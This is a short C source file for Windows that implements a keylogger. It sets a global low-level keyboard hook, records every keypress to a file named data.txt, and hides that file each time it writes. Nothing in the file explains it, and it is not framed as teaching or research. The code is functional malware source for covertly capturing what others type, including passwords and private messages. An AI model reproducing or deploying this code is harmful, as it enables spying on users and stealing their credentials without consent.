#define _CRT_SECURE_NO_WARNINGS
#include<windows.h>
#include<stdio.h>
#include<stdlib.h>
HHOOK hKeyboardHook;
int del=remove("data.txt");

FILE* fp = fopen("data.txt", "w");
LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, LPARAM lparam)
{
	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lparam;
	BOOL bShift;
	if (nCode == HC_ACTION)
	{
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
		{
			if (wParam == WM_KEYDOWN)
			{
				bShift = TRUE;
			}
			if (wParam == WM_KEYUP)
			{
				bShift = FALSE;
			}
			else
			{
				bShift = FALSE;
			}
		}
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			fprintf(fp, "%c", p->vkCode);
			fflush(fp);
			SetFileAttributesA("data.txt", FILE_ATTRIBUTE_HIDDEN);
			
			
		}
	}

	return CallNextHookEx(hKeyboardHook, nCode, wParam, lparam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	hKeyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)KeyboardCallback, GetModuleHandle(NULL), NULL);
	if (!hKeyboardHook)
	{
		printf("[-]SetWindowsHookExA error.(%d)\n", GetLastError());
		return EXIT_FAILURE;
	}
	else
	{
		MSG Msg;
		while (GetMessage(&Msg, NULL, 0, 0) > 0)
		{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
	}
	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}